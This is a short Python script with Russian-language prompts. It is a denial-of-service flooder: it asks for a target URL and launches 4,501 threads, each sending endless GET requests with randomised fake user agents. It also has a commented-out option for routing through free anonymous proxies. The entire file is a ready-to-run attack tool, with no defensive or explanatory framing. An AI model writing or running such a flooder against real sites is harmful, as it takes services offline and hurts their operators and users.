import requests
import threading
import colorama
import random
from fake_useragent import UserAgent
import time
# from fp.fp import FreeProxy

url = input("Введите URL :")

usag = UserAgent()

# proxy = FreeProxy(rand=True, anonym=True, https=True).get()

def dos(target):
    while True:
        res = requests.get(target, headers = {'User-Agent': usag.random})
        print("Запрос отправлен!")

i=0
while i < 4501:
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " потков начато!")
    i+=1
    time.sleep(0.000001)
    
            
